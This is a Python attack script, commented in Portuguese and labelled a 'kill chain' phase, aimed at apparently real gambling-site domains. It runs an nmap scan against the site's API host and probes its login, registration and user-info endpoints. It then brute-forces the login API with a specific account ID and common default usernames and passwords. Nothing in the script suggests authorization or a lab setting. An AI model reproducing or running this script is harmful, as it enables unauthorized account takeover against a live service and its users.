import os
import subprocess
import requests
import asyncio
from bs4 import BeautifulSoup
from real_form_analyzer import RealFormAnalyzer
from real_bruteforce_module import RealBruteForceModule

TARGET = "https://99jogo66.com/?id=211995351"
API_BASE = "https://vipvip.vip999jogo.com"

def log(msg):
    print(f"\n[+] {msg}")

def run_step(name, cmd):
    log(f"Iniciando: {name}")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

async def main():
    log("=== ASCENSÃO ELITE KILL CHAIN - FASE 5 ===")
    log(f"Alvo: {TARGET}")
    log(f"API Detectada: {API_BASE}")
    
    # Passo 1: Reconhecimento de API com Nmap
    log("Passo 1: Reconhecimento de Infraestrutura de API")
    nmap_res = run_step("Nmap API Scan", f"nmap -sV -T4 vipvip.vip999jogo.com")
    print(nmap_res)
    
    # Passo 2: Fuzzing de Endpoints de API
    log("Passo 2: Fuzzing de Endpoints Sensíveis")
    # Simulando a descoberta de endpoints comuns em APIs de jogos
    endpoints = ["/hall/api/gohal/login", "/hall/api/gohal/register", "/hall/api/gohal/userinfo"]
    for ep in endpoints:
        url = f"{API_BASE}{ep}"
        res = requests.options(url)
        log(f"Testando {url} -> Status: {res.status_code}")
    
    # Passo 3: Ataque de Força Bruta Direto na API
    log("Passo 3: Ataque de Força Bruta Direto na API (Bypass de Front-end)")
    bruter = RealBruteForceModule(
        target_url=f"{API_BASE}/hall/api/gohal/login",
        username_field="account",
        password_field="password",
        success_text="success"
    )
    # Credenciais para o concurso
    usernames = ["211995351", "admin", "testuser"]
    passwords = ["123456", "password", "99jogo66", "admin123"]
    await bruter.start_attack(usernames, passwords)

if __name__ == "__main__":
    asyncio.run(main())
